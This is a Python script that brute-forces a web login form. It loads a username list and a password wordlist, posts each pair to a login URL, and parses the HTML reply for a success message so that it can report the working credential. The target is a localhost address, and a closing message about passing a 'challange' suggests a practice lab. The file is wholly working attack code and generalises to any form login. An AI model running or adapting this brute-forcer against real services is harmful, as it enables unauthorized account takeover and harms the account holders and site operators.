from bs4 import BeautifulSoup
import requests

def load_credentials():
    username = []
    password = []

    with open('/home/isaac/sentinel/user.txt', 'r') as f:
        for line in f:
            user = line.strip()
            if user:
                username.append(f"{user}")
    
    with open('/home/isaac/sentinel/wordlist.txt', 'r') as f:
        for line in f:
            passwd = line.strip()
            if passwd:
                password.append(f"{passwd}")

    return username, password

def brute(target):
    usernames, passwords = load_credentials()
    session = requests.Session()
    
    for user in usernames:
        for passwd in passwords:
            print('[+] trying {}:{}...........\r'.format(user,passwd), end=''+ '\n')

            try:
                data_form = {
                    'username': user,
                    'password': passwd
                }
                response = session.post(
                    url=target,
                    data=data_form,
                    verify=True,
                    allow_redirects=True,
                    headers={'Content-Type': 'application/x-www-form-urlencoded'}
                )
                soup = BeautifulSoup(response.text, 'html.parser')
                message = soup.find('h3')
                link = message.text.split('-')[-1].strip()
                
                if 'sukses!' in message.text:
                    print('\n[+] Credential Found!!!')
                    print(f'[+] Username: {user}\n[+] Password: {passwd}')
                    print('[+] Login successfully!')
                    print(f'[+] Link: {link}')
                    return (user, passwd)
                else:
                    print('[-] Invalid Credential!!!\n')
                
            except requests.exceptions.RequestException as e:
                print(f"\n[!] Error trying {user}:{passwd} - {str(e)}")
                break

    return (None, None)


def main():
    target = 'http://127.0.0.1:5000/login'

    print(f'[+] Starting Brute Force attack on {target}')
    print(f'[+] Loaded credentials: ', len(load_credentials()))

    user, passwd = brute(target)

    if user and passwd:
        print('[+] Brute force challange has been passed')
    else:
        print('Credential not found!')

if __name__ == '__main__':
    main()